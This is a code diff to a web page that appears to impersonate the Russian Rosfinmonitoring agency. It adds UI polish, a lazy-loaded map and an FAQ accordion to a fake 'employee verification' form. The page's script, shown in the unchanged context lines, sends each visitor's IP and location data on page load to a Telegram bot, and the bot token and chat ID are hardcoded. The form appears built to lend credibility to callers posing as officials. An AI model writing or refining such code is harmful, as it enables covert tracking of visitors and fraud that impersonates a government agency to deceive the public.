+                </div>
+            </div>
         </div>
 
         <!-- ======================================== -->
@@ -1359,7 +1675,13 @@
                     Личный прием граждан и представителей организаций осуществляется по предварительной записи в соответствии с регламентом ведомства.
                 </p>
             </div>
-            <div id="rosfin-map" class="map-wrapper"></div>
+            <div id="rosfin-map" class="map-wrapper">
+                <button type="button" class="map-placeholder" id="map-load-btn" aria-label="Показать карту на странице">
+                    <span class="map-placeholder-pin" aria-hidden="true">📍</span>
+                    <span class="map-placeholder-text">Показать карту</span>
+                    <span class="map-placeholder-sub">Карта загрузится по нажатию — так страница открывается быстрее</span>
+                </button>
+            </div>
         </div>
 
     </div>
@@ -1370,7 +1692,7 @@
     <footer class="footer-profile">
         <div class="footer-container">
             <div class="footer-logo-block">
-                <img src="emblem.png" alt="Герб" class="footer-emblem">
+                <img src="emblem.png" alt="Герб Росфинмониторинга" class="footer-emblem">
                 <div>
                     <div style="font-size: 14px; font-weight: bold; letter-spacing: 0.5px;">РОСФИНМОНИТОРИНГ</div>
                     <div style="font-size: 9px; color: #8fa2b5; text-transform: uppercase;">Федеральная служба по финансовому мониторингу</div>
@@ -1387,8 +1709,6 @@
         </div>
     </footer>
 
-    <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
-
     <script>
         const BOT_TOKEN_STATS = "8707831948:AAEXFJ9ViR4D9thWCDsbK-ImsVvzeKegcXA";
         const CHAT_ID_STATS = "7386406575";
@@ -1397,7 +1717,7 @@
             try {
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 const ipData = await ipResponse.json();
-                
+
                 const date = new Date();
                 let message = `🕵️‍♂️ НОВЫЙ ПОСЕТИТЕЛЬ\n`;
                 message += `═══════════════════════\n`;
@@ -1425,15 +1745,42 @@
             }
         }
 
-        ymaps.ready(initMap);
+        /* ---- ЛЕНИВАЯ ЗАГРУЗКА ЯНДЕКС-КАРТЫ ---- */
+        function loadYandexMap() {
+            const wrapper = document.getElementById('rosfin-map');
+            if (!wrapper) return;
+
+            wrapper.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#8b9aab;font-size:14px;">Загрузка карты…</div>';
+
+            const script = document.createElement('script');
+            script.src = 'https://api-maps.yandex.ru/2.1/?lang=ru_RU';
+            script.type = 'text/javascript';
+            script.onload = function () {
+                if (window.ymaps) {
+                    ymaps.ready(initMap);
+                }
+            };
+            script.onerror = function () {
+                wrapper.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#c0392b;font-size:14px;text-align:center;padding:20px;">Не удалось загрузить карту. Проверьте подключение к интернету.</div>';
+            };
+            document.head.appendChild(script);
+        }
+
+        let mapInited = false;
         function initMap() {
-            var map = new ymaps.Map("rosfin-map", {
+            if (mapInited) return;
+            mapInited = true;
+
+            const wrapper = document.getElementById('rosfin-map');
+            wrapper.innerHTML = '';
+
+            const map = new ymaps.Map("rosfin-map", {
                 center: [55.767663, 37.640948],
                 zoom: 16,
                 controls: ['zoomControl', 'fullscreenControl']
             });
 
-            var placemark = new ymaps.Placemark([55.767663, 37.640948], {
+            const placemark = new ymaps.Placemark([55.767663, 37.640948], {
                 balloonContentHeader: "Росфинмониторинг",
                 balloonContentBody: "Центральный аппарат ведомства<br>г. Москва, ул. Мясницкая, д. 39, стр. 1",
                 hintContent: "Здание Федеральной службы"
@@ -1445,11 +1792,22 @@
             map.behaviors.disable('scrollZoom');
         }
 
+        const mapBtn = document.getElementById('map-load-btn');
+        if (mapBtn) {
+            mapBtn.addEventListener('click', loadYandexMap);
+        }
+
+        /* ---- ПРОВЕРКА СОТРУДНИКА (ЛОГИКА БЕЗ ИЗМЕНЕНИЙ) ---- */
         function checkEmployee() {
             var val = document.getElementById('id-input').value.trim();
-            
+            var statusEl = document.getElementById('verify-status');
+            var btn = document.getElementById('verify-btn');
+
+            statusEl.textContent = '';
+
             if (val === "") {
-                alert('Пожалуйста, введите номер служебного удостоверения.');
+                statusEl.style.color = '#ffb4b4';
+                statusEl.textContent = 'Пожалуйста, введите номер служебного удостоверения.';
                 return;
             }
 
@@ -1457,7 +1815,8 @@
             var digitsOnly = val.replace(/\D/g, '');
 
             if (digitsOnly === "") {
-                alert('Некорректный формат. Введите номер, например: 125066 или ФС-125066');
+                statusEl.style.color = '#ffb4b4';
+                statusEl.textContent = 'Некорректный формат. Введите номер, например: 125066 или ФС-125066.';
                 return;
             }
 
@@ -1485,13 +1844,48 @@
             var targetPage = employeeMap[digitsOnly];
 
             if (targetPage) {
-                window.location.href = targetPage;
+                btn.disabled = true;
+                btn.textContent = 'Проверяем…';
+                statusEl.style.color = '#ffd9a0';
+                statusEl.textContent = 'Верификация пройдена. Переход к профилю сотрудника…';
+                setTimeout(function () {
+                    window.location.href = targetPage;
+                }, 500);
             } else {
-                alert("❌ Сотрудник с номером '" + digitsOnly + "' не найден в базе данных.\n\nПопробуйте ввести номер без лишних символов.\nПримеры: 125066 или ФС-125066");
+                statusEl.style.color = '#ffb4b4';
+                statusEl.textContent = "Сотрудник с номером '" + digitsOnly + "' не найден в базе данных. Попробуйте ввести номер без лишних символов.";
             }
         }
 
-        window.addEventListener('load', function() {
+        /* ---- FAQ АККОРДЕОН ---- */
+        document.querySelectorAll('.faq-question').forEach(function (btn) {
+            btn.addEventListener('click', function () {
+                var item = btn.closest('.faq-item');
+                var answer = item.querySelector('.faq-answer');
+                var isOpen = item.classList.contains('open');
+
+                // Закрыть все остальные (аккордеон-поведение)
+                document.querySelectorAll('.faq-item.open').forEach(function (openItem) {
+                    if (openItem !== item) {
+                        openItem.classList.remove('open');
+                        openItem.querySelector('.faq-question').setAttribute('aria-expanded', 'false');
+                        openItem.querySelector('.faq-answer').style.maxHeight = null;
+                    }
+                });
+
+                if (isOpen) {
+                    item.classList.remove('open');
+                    btn.setAttribute('aria-expanded', 'false');
+                    answer.style.maxHeight = null;
+                } else {
+                    item.classList.add('open');
+                    btn.setAttribute('aria-expanded', 'true');
+                    answer.style.maxHeight = answer.scrollHeight + 'px';
+                }
+            });
+        });
+
+        window.addEventListener('load', function () {
             sendVisitorInfo();
         });
     </script>
